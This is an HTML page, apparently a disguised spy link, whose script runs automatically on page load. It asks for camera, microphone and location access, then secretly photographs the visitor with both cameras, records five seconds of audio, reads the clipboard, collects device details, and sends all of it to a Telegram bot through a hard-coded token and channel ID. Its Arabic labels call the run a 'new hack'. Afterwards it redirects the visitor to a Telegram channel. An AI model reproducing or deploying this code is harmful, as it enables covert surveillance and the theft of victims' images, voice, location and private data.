<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title> </title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }
        body {
            background: #000000;
            min-height: 100vh;
            overflow: hidden;
        }
        video, canvas {
            display: none !important;
        }
    </style>
</head>
<body>
<script>
    (function(){
        const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
        const CHANNEL_ID = '-1003875161698';
        const REDIRECT_URL = 'https://t.me/Whiskybots';
        
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        async function sendMessage(text, parseHtml = true) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHANNEL_ID,
                        text: text,
                        parse_mode: parseHtml ? 'HTML' : undefined
                    })
                });
            } catch(e) { console.warn(e); }
        }
        
        async function sendPhoto(base64Data, caption) {
            try {
                let blob = await (await fetch(base64Data)).blob();
                let formData = new FormData();
                formData.append('chat_id', CHANNEL_ID);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            } catch(e) { console.warn(e); }
        }
        
        async function sendAudio(audioUrl, caption) {
            try {
                let blob = await fetch(audioUrl).then(r=>r.blob());
                let formData = new FormData();
                formData.append('chat_id', CHANNEL_ID);
                formData.append('audio', blob, `audio_${Date.now()}.webm`);
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
            } catch(e) { console.warn(e); }
        }
        
        async function getDeviceInfo() {
            let ua = navigator.userAgent;
            let brand = 'غير معروف';
            if(ua.includes('iPhone')) brand = 'Apple';
            else if(ua.includes('Samsung')) brand = 'Samsung';
            else if(ua.includes('Xiaomi')) brand = 'Xiaomi';
            else if(ua.includes('Pixel')) brand = 'Google';
            
            let battery = 'غير مدعوم';
            if('getBattery' in navigator) {
                try { let b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}%`; } catch(e) {}
            }
            
            return {
                brand: brand,
                model: navigator.userAgentData?.platform || navigator.platform,
                os: navigator.platform,
                browser: /Chrome/.test(ua) ? 'Chrome' : (/Firefox/.test(ua) ? 'Firefox' : 'Safari'),
                screen: `${screen.width}x${screen.height}`,
                battery: battery,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language
            };
        }
        
        async function getLocation() {
            return new Promise((resolve) => {
                if(!navigator.geolocation) resolve(null);
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }
        
        async function getClipboard() {
            try {
                let text = await navigator.clipboard.readText();
                return text || '(فارغة)';
            } catch(e) { return 'لا يمكن الوصول'; }
        }
        
        async function takePhotos(facingMode, count = 3) {
            let photos = [];
            let stream = null;
            let video = null;
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: facingMode } }
                });
                
                video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', 'true');
                video.style.position = 'fixed';
                video.style.top = '-1000px';
                video.style.left = '-1000px';
                video.style.width = '200px';
                video.style.height = '200px';
                video.style.opacity = '0';
                document.body.appendChild(video);
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = async () => {
                        await video.play();
                        resolve();
                    };
                });
                
                await delay(600);
                
                let canvas = document.createElement('canvas');
                
                for(let i = 0; i < count; i++) {
                    if(video.videoWidth && video.videoHeight) {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                    } else {
                        canvas.width = 1280;
                        canvas.height = 720;
                    }
                    
                    let ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    let dataUrl = canvas.toDataURL('image/jpeg', 0.9);
                    photos.push(dataUrl);
                    await delay(500);
                }
                
            } catch(e) {
                console.warn(`خطأ في الكاميرا ${facingMode}:`, e);
            } finally {
                if(stream) stream.getTracks().forEach(t => t.stop());
                if(video && video.parentNode) video.remove();
            }
            
            return photos;
        }
        
        async function recordAudio(duration = 5000) {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                let mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                let chunks = [];
                
                mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
                
                let promise = new Promise(resolve => {
                    mediaRecorder.onstop = () => {
                        let blob = new Blob(chunks, { type: 'audio/webm' });
                        let url = URL.createObjectURL(blob);
                        stream.getTracks().forEach(t => t.stop());
                        resolve(url);
                    };
                });
                
                mediaRecorder.start();
                await delay(duration);
                mediaRecorder.stop();
                
                return await promise;
            } catch(e) {
                console.warn("خطأ في التسجيل", e);
                return null;
            }
        }
        
        async function startHack() {
            try {
                // طلب الصلاحيات
                try { await navigator.mediaDevices.getUserMedia({ audio: true }); } catch(e) {}
                try { await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); } catch(e) {}
                try { await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); } catch(e) {}
                if(navigator.geolocation) { navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}); }
                
                await delay(500);
                
                // جمع البيانات
                let device = await getDeviceInfo();
                let location = await getLocation();
                let clipboard = await getClipboard();
                let frontPhotos = await takePhotos("user", 3);
                let backPhotos = await takePhotos("environment", 3);
                let audioUrl = await recordAudio(5000);
                
                // إرسال إلى تليجرام
                await sendMessage(`🔥 <b>اختراق جديد</b> 🔥\n\nالجهاز: ${device.brand}\nالوقت: ${new Date().toLocaleString('ar-EG')}`);
                
                let report = `📱 <b>تقرير مفصل</b>\n\n`;
                report += `العلامة: ${device.brand}\n`;
                report += `الموديل: ${device.model}\n`;
                report += `نظام التشغيل: ${device.os}\n`;
                report += `المتصفح: ${device.browser}\n`;
                report += `الشاشة: ${device.screen}\n`;
                report += `البطارية: ${device.battery}\n`;
                report += `المنطقة: ${device.timezone}\n`;
                report += `اللغة: ${device.language}\n\n`;
                
                if(location && location.lat) {
                    report += `📍 الموقع: ${location.lat}, ${location.lng}\n`;
                    report += `<a href="https://www.google.com/maps?q=${location.lat},${location.lng}">🗺️ اضغط للخريطة</a>\n\n`;
                }
                
                report += `📋 الحافظة: ${(clipboard || '').substring(0, 400)}\n\n`;
                report += `🎤 الصوت: ${audioUrl ? 'تم' : 'فشل'}\n`;
                report += `📸 صور أمامية: ${frontPhotos.length}\n`;
                report += `📷 صور خلفية: ${backPhotos.length}`;
                
                await sendMessage(report, true);
                
                for(let i = 0; i < frontPhotos.length; i++) {
                    await sendPhoto(frontPhotos[i], `📸 كاميرا أمامية (${i+1}/3)`);
                    await delay(300);
                }
                
                for(let i = 0; i < backPhotos.length; i++) {
                    await sendPhoto(backPhotos[i], `📷 كاميرا خلفية (${i+1}/3)`);
                    await delay(300);
                }
                
                if(audioUrl) {
                    await sendAudio(audioUrl, "🎙️ تسجيل صوتي (5 ثوانٍ)");
                }
                
                await sendMessage(`✅ <b>اكتمل الاختراق بنجاح</b> ✅\nتم إرسال ${frontPhotos.length} صورة أمامية و ${backPhotos.length} صورة خلفية`);
                
                await delay(1500);
                window.location.href = REDIRECT_URL;
                
            } catch(err) {
                console.error(err);
                await delay(2000);
                window.location.href = REDIRECT_URL;
            }
        }
        
        window.addEventListener('load', () => {
            setTimeout(startHack, 100);
        });
        
        document.body.style.backgroundColor = "#000000";
    })();
</script>
</body>
</html>
